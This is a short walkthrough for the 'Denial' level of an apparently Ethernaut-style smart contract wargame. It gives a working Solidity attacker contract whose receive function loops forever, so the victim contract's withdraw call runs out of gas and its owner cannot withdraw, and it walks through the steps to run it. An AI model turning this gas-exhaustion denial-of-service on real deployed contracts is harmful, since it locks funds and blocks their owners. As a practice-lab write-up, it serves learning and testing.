# Denial  
This level requires a DOS attack to solve it.The key to solve it to use all the gas and prevents the owner to withdraw.

## Steps:
1. Deploy an exploiting contract with a `fallback` or `receive` function.
````solidity
pragma solidity ^0.8.0;

interface Denial{
    function setWithdrawPartner(address) external ;
    function withdraw() external;
}

contract Attack{
    Denial denial;
    constructor() public payable{
    }

    function exploit(address victim) public {
        denial = Denial(victim);
        denial.setWithdrawPartner(address(this));
        denial.withdraw();
    }
    receive() payable external{
       while(true){
       }//it is were all the gas is used
    }

}

````
2. Call the exploit function and pass your instance address.By calling this function you will set the `partner` to your  contract address and call the `withdraw` function.

The `withdraw` function will send some ether to your contract ,this will trigger the  `receive` function and use all the transaction gas.